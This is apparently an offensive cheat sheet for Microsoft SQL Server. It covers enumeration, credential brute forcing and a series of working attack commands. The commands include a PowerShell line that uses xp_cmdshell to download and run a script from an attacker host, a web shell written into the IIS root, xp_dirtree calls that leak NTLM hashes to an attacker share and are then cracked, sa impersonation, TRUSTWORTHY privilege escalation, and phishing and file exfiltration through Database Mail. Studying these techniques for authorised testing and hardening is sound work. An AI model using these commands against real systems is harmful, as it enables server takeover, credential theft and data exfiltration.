#MSSQL #MicrosoftSQLServer #database

## What is MSSQL?
Microsoft SQL Server — closed-source relational DBMS. Primary database on Windows enterprise networks. Default service account is `NT Service\MSSQLSERVER`. Encryption not enabled by default. Authentication can be local SQL auth or Windows auth (AD Kerberos/NTLM).

- Port: **TCP 1433** (default instance), **UDP 1434** (SQL Browser — discovers named instances)
- Named instances use dynamic ports — discovered via UDP 1434 or nmap

---

## Default Databases

| Database | Description |
|---|---|
| `master` | System info, logins, linked servers, server config |
| `model` | Template for all new databases |
| `msdb` | SQL Agent jobs, alerts, backup history |
| `tempdb` | Temp objects and session data |
| `resource` | Read-only, contains system objects |

---

## Configuration Files

| File | Path |
|---|---|
| SQL Server error log | `C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\LOG\ERRORLOG` |
| SQL Agent log | `C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\LOG\SQLAGENT.OUT` |

---

## Enumeration

```bash
# Discover instances + version info
nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info -sV <target>

# Brute force credentials
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# Check for empty SA password
nmap -p 1433 --script ms-sql-empty-password <target>
```

```
# Metasploit
use auxiliary/scanner/mssql/mssql_ping       # discover + enumerate instances
use auxiliary/scanner/mssql/mssql_login      # brute force
use auxiliary/admin/mssql/mssql_enum         # full enum post-auth
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_findandsampledata
```

---

## Connect / Access

```bash
# Impacket — SQL auth (Linux)
mssqlclient.py <user>:<pass>@<target>

# Impacket — Windows auth (domain)
mssqlclient.py <domain>/<user>:<pass>@<target> -windows-auth

# Impacket — Windows auth (local)
mssqlclient.py ./<user>:<pass>@<target> -windows-auth

# sqsh (Linux)
sqsh -S <target> -U <user> -P <pass> -D <database>

# sqlcmd (Windows)
sqlcmd -S <target> -U <user> -P <pass>
sqlcmd -S <target> -U <user> -P <pass> -Q "SELECT @@version"
```

---

## Key SQL Commands

```sql
-- Version and instance info
SELECT @@version;
SELECT @@SERVERNAME;

-- Current user and privileges
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Current database
SELECT DB_NAME();

-- List all databases
SELECT name FROM master.dbo.sysdatabases;

-- List tables in current db
SELECT * FROM information_schema.tables WHERE table_type = 'BASE TABLE';

-- List all logins
SELECT sp.name AS login, sp.type_desc, sl.is_disabled
FROM sys.server_principals sp
LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id
WHERE sp.type NOT IN ('G','R');

-- Check connection encryption
SELECT session_id, net_transport, protocol_type, auth_scheme, encrypt_option
FROM SYS.DM_EXEC_CONNECTIONS;

-- Check permissions for current login
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'CONTROL SERVER') AS HasControlServer;
SELECT HAS_PERMS_BY_NAME('xp_cmdshell', 'OBJECT', 'EXECUTE') AS CanExecCmdshell;
SELECT HAS_PERMS_BY_NAME('xp_instance_regread', 'OBJECT', 'EXECUTE') AS CanReadRegistry;
```

---

## Attack Vectors

### Enable and Use xp_cmdshell

```sql
-- Check current status
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable (requires sysadmin)
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- OS command execution
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker>/shell.ps1'')"';
```

### Read Files

```sql
-- OPENROWSET bulk read (simplest)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS contents;
GO

-- OLE Automation ReadAll (requires Ole Automation Procedures enabled)
DECLARE @FileContents VARCHAR(MAX);
DECLARE @OLE INT;
DECLARE @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\path\to\file.txt', 1;
EXEC sp_OAMethod @FileID, 'ReadAll', @FileContents OUT;
EXEC sp_OADestroy @FileID;
EXEC sp_OADestroy @OLE;
SELECT @FileContents AS FileContents;

-- BULK INSERT (requires FILE privilege + target table)
BULK INSERT TempTable
FROM 'C:\windows\system32\drivers\etc\hosts'
WITH (FIELDTERMINATOR = ',', ROWTERMINATOR = '\n');
```

### Check File Existence

```sql
-- Check if a specific file exists via xp_dirtree
DECLARE @FileExists TABLE (
    subdirectory NVARCHAR(255),
    depth INT,
    isFile BIT
);
INSERT INTO @FileExists
EXEC master.sys.xp_dirtree 'C:\Windows\System32\drivers\etc', 1, 1;
SELECT * FROM @FileExists WHERE subdirectory = 'hosts';
```

### Write Files via OLE Automation (Web Shell)

```sql
-- Enable OLE Automation
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Write web shell to web root
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\inetpub\wwwroot\shell.asp', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<%execute(request("cmd"))%>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
```

### NTLM Hash Theft via xp_dirtree

```bash
# Start capture listener
sudo responder -I tun0
# or
sudo impacket-smbserver share ./ -smb2support
```

```sql
-- Trigger outbound SMB auth to attacker
EXEC master..xp_dirtree '\\<attacker_ip>\share\';
EXEC master..xp_subdirs '\\<attacker_ip>\share\';
```

```bash
# Crack captured NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Alternative: capture via Wireshark/tcpdump pcap then extract with NTLMRawUnHide
python3 NTLMRawUnHide.py -i capture.pcap -o hashes.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Impersonation

```sql
-- Find impersonatable users
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate and escalate
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT;  -- drop back to original user
```

### Linked Servers

```sql
-- Enumerate linked servers
SELECT srvname, isremote FROM sysservers;
EXECUTE sp_linkedservers;

-- Run query on linked server
EXECUTE ('SELECT @@version') AT [linked_server_name];
EXECUTE ('EXECUTE xp_cmdshell ''whoami''') AT [linked_server_name];

-- OpenQuery

SELECT * FROM OPENQUERY("linked_server_name", 'SELECT SYSTEM_USER');
```

### TRUSTWORTHY Database Privilege Escalation

If a database has `TRUSTWORTHY=ON` and is owned by a `sysadmin` account, a `db_owner` user in that database can escalate to `sysadmin`.

```sql
-- Find TRUSTWORTHY databases owned by sysadmin
SELECT name, database_id, is_trustworthy_on
FROM sys.databases
WHERE is_trustworthy_on = 1 AND owner_sid != 0x01;

-- Check if current user has db_owner in a TRUSTWORTHY db
SELECT rp.name AS database_role, mp.name AS database_user
FROM sys.database_role_members drm
JOIN sys.database_principals rp ON drm.role_principal_id = rp.principal_id
JOIN sys.database_principals mp ON drm.member_principal_id = mp.principal_id
WHERE rp.name = 'db_owner';

-- Create a stored procedure to add our user to sysadmin
USE <trustworthy_db>;
CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS
    EXEC sp_addsrvrolemember 'currentuser', 'sysadmin';
GO

EXEC sp_privesc;

-- Verify escalation
SELECT IS_SRVROLEMEMBER('sysadmin');
```

---

### Database Mail Abuse (sp_send_dbmail)

Database Mail can be used for phishing from a trusted internal server, or to exfil files as attachments.

```sql
-- Check if Database Mail is enabled
SELECT name, value, value_in_use, description
FROM sys.configurations
WHERE name = 'Database Mail XPs';

-- Check if public has EXECUTE on sp_send_dbmail
USE msdb;
SELECT dp.name AS PrincipalName, o.name AS ObjectName, p.permission_name, p.state_desc
FROM sys.database_permissions p
JOIN sys.database_principals dp ON p.grantee_principal_id = dp.principal_id
LEFT JOIN sys.objects o ON p.major_id = o.object_id
WHERE dp.name = 'public' AND p.permission_name = 'EXECUTE' AND o.name = 'sp_send_dbmail';

-- List mail profiles
EXEC sysmail_help_profile_sp;

-- Send phishing email with file attachment (exfil)
EXEC msdb.dbo.sp_send_dbmail
    @recipients = 'target@company.com',
    @from_address = 'no-reply@company.com',
    @subject = 'Action Required',
    @body = 'Please review the attached document.',
    @body_format = 'HTML',
    @file_attachments = 'C:\windows\system32\drivers\etc\hosts';
```

### Registry Read via xp_instance_regread

```sql
-- Read registry key (requires EXECUTE on xp_instance_regread or sysadmin)
EXECUTE master.sys.xp_instance_regread
    'HKEY_LOCAL_MACHINE',
    'SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\CurrentVersion',
    'CurrentVersion';

-- Read SA password hash location (older SQL versions store in registry)
EXECUTE master.sys.xp_regread
    'HKEY_LOCAL_MACHINE',
    'SYSTEM\CurrentControlSet\Services\MSSQLSERVER',
    'ObjectName';

-- Check if xp_instance_regread is granted to public
USE master;
SELECT pr.name, pe.permission_name, pe.state_desc
FROM sys.database_permissions AS pe
JOIN sys.all_objects AS ob ON pe.major_id = ob.object_id
JOIN sys.database_principals AS pr ON pe.grantee_principal_id = pr.principal_id
WHERE ob.name = 'xp_instance_regread';
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `xp_cmdshell` enabled | Direct OS command execution |
| `Ole Automation Procedures` enabled | File system write access |
| `Ad Hoc Distributed Queries` enabled | OPENROWSET read/exfil |
| SA with weak/default password | Full sysadmin |
| Service running as SYSTEM or domain admin | OS-level compromise |
| Linked servers with sysadmin context | Lateral movement |
| No encryption on connections | Credential interception |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (Linux, SQL auth) | `mssqlclient.py user:pass@host` |
| Connect (Linux, Windows auth) | `mssqlclient.py domain/user:pass@host -windows-auth` |
| Connect (Windows, sqlcmd) | `sqlcmd -S host -U user -P pass` |
| Current user | `SELECT SYSTEM_USER` |
| Is sysadmin? | `SELECT IS_SRVROLEMEMBER('sysadmin')` |
| All databases | `SELECT name FROM master.dbo.sysdatabases` |
| OS command | `EXECUTE xp_cmdshell 'whoami'` |
| NTLM theft | `EXEC xp_dirtree '\\attacker\share'` |
| Crack NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Nmap enum | `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password` |
